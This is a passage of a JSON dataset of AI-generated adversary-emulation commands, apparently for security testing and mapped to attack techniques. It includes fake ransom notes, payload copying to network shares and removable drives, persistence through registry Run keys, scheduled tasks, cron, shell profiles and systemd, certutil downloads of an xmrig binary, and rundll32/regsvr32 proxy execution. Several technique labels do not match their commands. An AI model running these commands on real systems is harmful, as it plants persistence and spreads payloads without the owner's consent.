      "ttp_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
      "technique_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "echo This is a test recovery note. Please contact support@testlab.local for assistance. > \"%TEMP%\\\\RECOVER_FILES.txt\"",
      "description": "Drops a benign ransom-like note into the user's temp directory using legacy cmd.exe echo command.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a file named RECOVER_FILES.txt in the user's TEMP directory with a benign message. Uses built-in cmd.exe echo to avoid PowerShell.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:26.988850",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.695,
      "validated": true
    },
    {
      "id": "2396a349-b1ad-42af-9220-ab502edf8bcb",
      "ttp_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
      "technique_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "powershell -Command \"try { $note = 'Your files have been locked. Contact help@fakemail.local for recovery.'; $path = \"$env:APPDATA\\\\RESTORE_INSTRUCTIONS.txt\"; Set-Content -Path $path -Value $note -Force } catch { exit 1 }\"",
      "description": "Uses PowerShell to write a fake ransom note to APPDATA directory with forced overwrite and error suppression.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates RESTORE_INSTRUCTIONS.txt in the user's APPDATA directory with a misleading message. Uses Set-Content with -Force and proper escaping. No recursion or system-wide access.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:26.988850",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.695,
      "validated": true
    },
    {
      "id": "c6558e53-08a3-42d4-ac01-dea3398880cd",
      "ttp_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
      "technique_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "mkdir \"%TEMP%\\\\EncryptedData\" -ErrorAction SilentlyContinue & echo Attention: All your files are encrypted. Send 1 BTC to [FAKE_ADDRESS] > \"%TEMP%\\\\EncryptedData\\\\HOW_TO_RECOVER.txt\"",
      "description": "Creates a subdirectory in TEMP and drops a phishing note mimicking ransomware instructions using cmd.exe.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a folder named EncryptedData in TEMP and writes a deceptive note inside. Uses only built-in Windows commands. Safe for testing as it operates within user TEMP space.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:26.988850",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.695,
      "validated": true
    },
    {
      "id": "0d64c663-1295-4690-947e-759c6005e009",
      "ttp_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
      "technique_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "echo 'Your files have been encrypted! Send 1 BTC to XXXXXXX to recover.' > \"$HOME/ransom_note.txt\"",
      "description": "Creates a fake ransom note in the user's home directory to simulate phishing-induced wiper activity.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named 'ransom_note.txt' is created in the user's home directory with a threatening but fake message.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:09:55.921295",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.695,
      "validated": true
    },
    {
      "id": "0613d41c-a16d-4ebd-9ab5-8e136747e58f",
      "ttp_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
      "technique_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "find \"$HOME/Documents\" -type d -exec sh -c 'echo \"All files locked. Contact help@fakeemail.com for recovery.\" > \"{}/PAYMENT.txt\"' \\;",
      "description": "Drops fake ransom notes in every directory under Documents to simulate widespread note deployment by malware.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Multiple 'PAYMENT.txt' files are created in subdirectories of Documents, each containing a phishing-style message intended to mislead the user.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:09:55.921295",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.695,
      "validated": true
    },
    {
      "id": "6dbc59cd-c627-4d65-9377-4067e9c31f1f",
      "ttp_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
      "technique_id": "3fc78bc2-a4f3-4f48-bee8-820a42e5b1d3",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "mkdir -p \"$HOME/Desktop/test_dirs\" && touch \"$HOME/Desktop/test_dirs/file1.txt\" \"$HOME/Desktop/test_dirs/file2.txt\" && echo 'Data breach detected. Pay ransom for non-disclosure.' > \"$HOME/Desktop/test_dirs/README.txt\"",
      "description": "Creates a test directory with files and drops a misleading note to simulate targeted phishing wiper behavior.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A test directory is created on the desktop with dummy files and a note designed to mimic a wiper's phishing message.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:09:55.921295",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.695,
      "validated": true
    },
    {
      "id": "c4ddd689-4a73-4b09-82f9-17be7290bcfe",
      "ttp_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
      "technique_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "cmd.exe /c echo \"Test command execution\" > \"%TEMP%\\debug.log\"",
      "description": "Basic command execution using cmd.exe to write a test message to a log file in the temporary directory.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a file named debug.log in the user's TEMP directory containing the text 'Test command execution'. No elevated privileges needed. Uses built-in cmd.exe.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.267815",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.685,
      "validated": true
    },
    {
      "id": "64800e58-6c32-49fc-b7c4-96297265998a",
      "ttp_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
      "technique_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f \"http://example.com/test.txt\" \"%TEMP%\\test.txt\" && cmd.exe /c type \"%TEMP%\\test.txt\"",
      "description": "Intermediate use of certutil.exe to download a file from a remote server and display its contents using cmd.exe.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download test.txt from example.com to the TEMP directory and outputs its content. Uses built-in certutil.exe. Fails silently if no network access. No actual payload is retrieved. Safe for isolated testing.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.267815",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.685,
      "validated": true
    },
    {
      "id": "576fb582-6cd4-4acd-954e-d8f600d3d389",
      "ttp_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
      "technique_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '%TEMP%\\_svc' -ErrorAction SilentlyContinue; $svc = sc.exe create TestService binPath= 'cmd.exe /c echo Service started > \"%TEMP%\\_svc\\started.log\"' start= auto; Start-Service TestService -ErrorAction SilentlyContinue; Remove-Item '%TEMP%\\_svc' -Recurse -ErrorAction SilentlyContinue\"",
      "description": "Advanced attack simulating service creation using sc.exe via PowerShell to execute a command on startup, requiring admin rights.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a directory in TEMP, registers a Windows service named 'TestService' that writes to a log file on start, attempts to start the service, then cleans up the directory. Requires elevated privileges to create and start services. Uses built-in sc.exe and cmd.exe. Cleanup uses -ErrorAction SilentlyContinue for robustness.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.267815",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.685,
      "validated": true
    },
    {
      "id": "2a44d421-7d5d-4203-8476-6e80dfcda73e",
      "ttp_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
      "technique_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "bash -c 'echo \"Running malicious payload\" && id'",
      "description": "Basic command execution using bash to run a simple command chain.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a test message and current user identity to stdout.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.452290",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.685,
      "validated": true
    },
    {
      "id": "f6ea56ec-1898-4cfb-a1c5-d5d4a3221338",
      "ttp_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
      "technique_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "echo '#!/bin/bash\\necho \"Persistence script activated\" > /tmp/persistence.log' > /tmp/script.sh && chmod +x /tmp/script.sh && /tmp/script.sh",
      "description": "Intermediate attack: creates a script file, sets execute permissions, and runs it.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a script in /tmp, executes it, and generates a log file indicating execution.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.452290",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.685,
      "validated": true
    },
    {
      "id": "7c907408-3427-458f-b971-0fec5c6b70a7",
      "ttp_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
      "technique_id": "82b29fd1-7165-43bc-9816-2eebd5eff689",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "linux",
      "command": "bash -c 'eval \"$(echo ZWNobyAiVGVzdCBvYmZ1c2NhdGVkIGNtZCIK | base64 -d)\"'",
      "description": "Advanced attack: executes an obfuscated base64-encoded command using eval and bash.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes and executes a base64-encoded command that prints a test message.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.452796",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.685,
      "validated": true
    },
    {
      "id": "3d347b5b-7db3-4b6c-a66b-590558398712",
      "ttp_id": "567bbfa8-427c-49cf-bcb2-0af157bd0ab3",
      "technique_id": "567bbfa8-427c-49cf-bcb2-0af157bd0ab3",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "dir \"%PROGRAMFILES%\" /a /b",
      "description": "Lists top-level directories in Program Files to identify installed software and potential regional configurations",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a brief list of directory names in Program Files without recursion. Runs with standard user privileges.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:00.263717",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.677,
      "validated": true
    },
    {
      "id": "56aaab34-ca9a-4cf7-a6f7-a7057746ad6e",
      "ttp_id": "567bbfa8-427c-49cf-bcb2-0af157bd0ab3",
      "technique_id": "567bbfa8-427c-49cf-bcb2-0af157bd0ab3",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "windows",
      "command": "where /R \"%WINDIR%\\System32\" rus*.dll",
      "description": "Searches for DLL files starting with 'rus' in System32, potentially indicating Russian language packs",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Recursively searches System32 for files matching rus*.dll and prints full paths if found. Limited scope prevents system overload.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:00.263717",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.677,
      "validated": true
    },
    {
      "id": "fbecf07e-ff40-45bd-b816-7c12eef614f9",
      "ttp_id": "567bbfa8-427c-49cf-bcb2-0af157bd0ab3",
      "technique_id": "567bbfa8-427c-49cf-bcb2-0af157bd0ab3",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "ls -la /usr/share/locale/ru_RU* /home/*/.config /etc/timezone 2>/dev/null",
      "description": "Basic file and directory listing to detect Russian locale files, user configs, and system timezone configuration",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists files related to Russian language locale, user configurations, and timezone settings if they exist; suppresses errors for missing paths",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:26.987735",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.677,
      "validated": true
    },
    {
      "id": "2840365c-50ba-4887-9a1b-684b65fd1208",
      "ttp_id": "567bbfa8-427c-49cf-bcb2-0af157bd0ab3",
      "technique_id": "567bbfa8-427c-49cf-bcb2-0af157bd0ab3",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "find /usr/share/i18n/locales /etc/locale.conf /home -type f -name '*ru*' -o -name 'locale*' -o -name 'timezone' 2>/dev/null | head -n 10",
      "description": "Intermediate search for files associated with Russian language or regional settings using find with name patterns",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Searches specific directories for files with 'ru', 'locale', or 'timezone' in the name, limiting output to first 10 results to avoid excessive output",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:26.987735",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.677,
      "validated": true
    },
    {
      "id": "18f088a7-a419-4d1b-b2a2-79d161ad3d80",
      "ttp_id": "567bbfa8-427c-49cf-bcb2-0af157bd0ab3",
      "technique_id": "567bbfa8-427c-49cf-bcb2-0af157bd0ab3",
      "technique_name": "File and Directory Discovery",
      "tactic": "Discovery",
      "platform": "linux",
      "command": "env | grep -i 'LANG\\|LC_\\|TZ' ; cat /etc/default/locale 2>/dev/null ; locale 2>/dev/null",
      "description": "Advanced environment and configuration file inspection to detect regional settings that may indicate the system is in Russia",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs environment variables related to language and timezone, attempts to read system locale default file, and prints current locale settings",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:26.987735",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.677,
      "validated": true
    },
    {
      "id": "a7af8777-431e-4e00-92b2-0dd9d8604041",
      "ttp_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
      "technique_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "cmd.exe /c \"copy \\%%UserProfile%%\\Documents\\benign.exe \\\\localhost\\C$\\Users\\Public\\benign.exe\"",
      "description": "Basic replication to a local administrative share to simulate lateral movement",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Copies a benign executable to the local C$ administrative share if network sharing is enabled and credentials permit access",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.370152",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "60227276-d87f-4fbc-af4a-6cecdfb51c2c",
      "ttp_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
      "technique_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "cmd.exe /c \"net use > %TEMP%\\shares.txt & for /f \"tokens=3\" %i in ('net use ^| findstr \\\\') do @copy \"%ProgramFiles%\\benign\\benign.exe\" \"%i\\benign.exe\"\"",
      "description": "Intermediate: Enumerates active network connections and copies a benign file to each mapped network share",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Lists current network connections, extracts share paths, and attempts to copy a benign file to each. Fails silently if no shares exist or access is denied",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.370758",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "77e66653-5022-40fb-8804-523680958db8",
      "ttp_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
      "technique_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "windows",
      "command": "powershell -Command \"mkdir '$env:TEMP\\payload' -ErrorAction SilentlyContinue; Set-Content -Path '$env:TEMP\\payload\\malware.exe' -Value 'test payload' -ErrorAction Stop; Get-PSDrive -PSProvider FileSystem | Where-Object {$_.DisplayRoot} | ForEach-Object { $dest = \"$($_.DisplayRoot)\\malware.exe\"; try { Copy-Item '$env:TEMP\\payload\\malware.exe' $dest -Force -ErrorAction Stop } catch { } }\"",
      "description": "Advanced: Uses PowerShell to detect mounted drives (including removable media) and copy a benign test file to each root directory",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a test payload in temp, enumerates all filesystem drives, and copies the file to the root of each accessible drive (e.g., USB sticks, network shares)",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.370758",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "1df81f1b-c8e9-4287-bb46-4303cc85c328",
      "ttp_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
      "technique_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "cp /tmp/test.payload /media/removable_drive/ && chmod +x /media/removable_drive/test.payload",
      "description": "Basic: Copy a test payload to a mounted removable drive and make it executable",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Copies a benign test file to a mounted removable device if present. Fails silently if no device is mounted at /media/removable_drive. No execution occurs.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:00.390003",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "64b16064-2fc5-44d6-bba5-33d9bb03f34a",
      "ttp_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
      "technique_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "find /mnt -maxdepth 2 -type d -name 'shared' -exec cp /tmp/test.payload {}/malware_copy  \\; -exec chmod +x {}/malware_copy \\;",
      "description": "Intermediate: Locate network shares under /mnt and copy test payload with execute permissions",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Searches for directories named 'shared' under /mnt up to depth 2 and copies a test payload into them. Simulates spreading to mapped network shares. Safe because it uses limited depth and a specific name filter.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:00.390003",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "b8fbc4b6-f58d-4dc5-ac18-af2da15c5691",
      "ttp_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
      "technique_id": "31653420-894f-46a4-8f33-e3a38cb7c5b4",
      "technique_name": "Exploit Public-Facing Application",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "for share in $(grep -o '/net/[^ ]*' /proc/mounts 2>/dev/null | head -5); do cp '/tmp/test.payload' \"$share/infect_test\" -f 2>/dev/null && chmod +x \"$share/infect_test\" 2>/dev/null; done",
      "description": "Advanced: Identify auto-mounted network shares via /proc/mounts and deploy test payload",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Extracts network-mounted paths from /proc/mounts, limits to 5 targets, and copies a benign test file. Uses -f only where supported (cp). No recursion. Targets common auto-mount locations safely.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:07:00.390003",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "12deb980-1a87-41cb-8371-2aa2020907d9",
      "ttp_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
      "technique_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
      "technique_name": "Boot or Logon Autostart Execution",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "copy /y \"%TEMP%\\malicious.bat\" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.bat\"",
      "description": "Copies a batch script to the current user's Startup folder to execute on logon.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The script 'malicious.bat' is copied to the user's Startup folder. It will execute each time the user logs in. This uses built-in copy command and targets user context, no admin rights needed.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.371769",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "80684495-3dec-4e7a-881f-12117a0f1e8f",
      "ttp_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
      "technique_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
      "technique_name": "Boot or Logon Autostart Execution",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemService\" /t REG_SZ /d \"cmd.exe /c %TEMP%\\payload.bat\" /f",
      "description": "Adds a registry entry to execute a command at system boot via the Run key (machine-wide autostart).",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The registry key is added under HKLM\\...\\Run, causing the payload.bat script to run at boot for all users. Requires admin privileges. Uses built-in reg.exe. The /f flag forces overwrite without prompt.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.371769",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "16c84173-44a7-4156-b642-c7f566bf77bd",
      "ttp_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
      "technique_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
      "technique_name": "Boot or Logon Autostart Execution",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "schtasks /create /tn \"DailyMaintenance\" /tr \"%TEMP%\\startup_task.bat\" /sc onlogon /rl highest /f",
      "description": "Creates a scheduled task that runs a script at user logon with highest privileges.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "A scheduled task named 'DailyMaintenance' is created to run at user logon with elevated privileges. Requires admin rights. Uses built-in schtasks.exe. The /f flag forces creation even if task exists.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.371769",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "4f6c0f86-d7c1-4c46-9c8b-ff0cc9de1ddf",
      "ttp_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
      "technique_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
      "technique_name": "Boot or Logon Autostart Execution",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo '@reboot root /bin/sh -c \"echo \\\"test-persistence $(date)\\\" >> /tmp/bootlog.txt\"' >> /etc/crontab",
      "description": "Adds a cron job to /etc/crontab to execute a command at boot as root",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new line is added to /etc/crontab that runs a shell command at system boot. The command appends a timestamped message to /tmp/bootlog.txt. This persists across reboots.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.837925",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "65f19874-01ce-4f1c-b9f6-ac31485933de",
      "ttp_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
      "technique_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
      "technique_name": "Boot or Logon Autostart Execution",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo 'sh -c \"echo \\\"user-persistence $(date)\\\" >> $HOME/.local/share/userlog.txt\"' >> $HOME/.bash_profile",
      "description": "Appends a command to the user's shell profile to execute on login",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The command adds a line to the user's .bash_profile that executes a shell snippet on each login. The snippet writes a timestamped message to a file in the user's home directory. This persists across user sessions.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.837925",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "d76aa1d6-4bdb-46f0-a6f7-1ded06329cdd",
      "ttp_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
      "technique_id": "4acfc0e9-f4ca-4f21-9af1-cb412e8aa97d",
      "technique_name": "Boot or Logon Autostart Execution",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "cat << 'EOF' > /etc/systemd/system/persistence-test.service\n[Unit]\nDescription=Test Persistence Service\n[Service]\nExecStart=/bin/sh -c 'echo \"systemd-persistence $(date)\" >> /tmp/systemd.log'\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl daemon-reload && systemctl enable persistence-test.service",
      "description": "Creates a systemd service that runs at boot and enables it",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A systemd service unit file is created in /etc/systemd/system. After reloading the daemon and enabling the service, it will execute a shell command at boot that logs a timestamped message to /tmp/systemd.log. The service is persistent across reboots.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.837925",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.676,
      "validated": true
    },
    {
      "id": "6487406d-8912-4244-b8a3-16ef7e263bb8",
      "ttp_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
      "technique_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
      "technique_name": "Signed Binary Proxy Execution",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://127.0.0.1/xmrig.exe %TEMP%\\xmrig_test.exe",
      "description": "Download a binary using certutil, a signed Microsoft utility, to stage a payload in temp directory",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from a local server (likely fails silently in test), stores it in %TEMP% as xmrig_test.exe if successful. Uses built-in certutil.exe which is code-signed.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.204063",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.674,
      "validated": true
    },
    {
      "id": "ee2bc9c4-b977-4dc8-84f4-5e645c1918a4",
      "ttp_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
      "technique_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
      "technique_name": "Signed Binary Proxy Execution",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "rundll32.exe %TEMP%\\xmrig_test.dll,StartXMRig",
      "description": "Execute a DLL function using rundll32, a signed Microsoft binary, to proxy execution",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to load and execute StartXMRig function from xmrig_test.dll in temp. Will fail if file doesn't exist, but demonstrates proxy execution via signed binary.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.204063",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.674,
      "validated": true
    },
    {
      "id": "a7619d0d-4978-4dc8-a453-1b20f3dccecc",
      "ttp_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
      "technique_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
      "technique_name": "Signed Binary Proxy Execution",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "regsvr32.exe /s /n /u /i:%TEMP%\\xmrig_sct.txt scrobj.dll",
      "description": "Use regsvr32, a signed Microsoft binary, to execute script from a local .sct file for proxy execution",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Silently loads and executes a script from xmrig_sct.txt using regsvr32 and scrobj.dll (both signed). The .sct file would need to be present in %TEMP% to run code.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:01.204063",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.674,
      "validated": true
    },
    {
      "id": "cd423e16-8738-44ef-afd0-4de71615c38c",
      "ttp_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
      "technique_id": "37a8e79d-b56c-4406-8727-3f77804e9452",
      "technique_name": "Signed Binary Proxy Execution",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "echo 'echo \"Test payload via awk\"' > /tmp/stage.sh && awk 'BEGIN {system(\"/bin/sh /tmp/stage.sh\")}'",
      "description": "Basic use of awk (a signed binary) to execute a shell script, demonstrating proxy execution.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs 'Test payload via awk' to stdout using awk to proxy shell execution.",
      "source": "langchain",
      "generated_at": "2025-12-28T09:05:02.542792",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.674,
      "validated": true
    },
    {
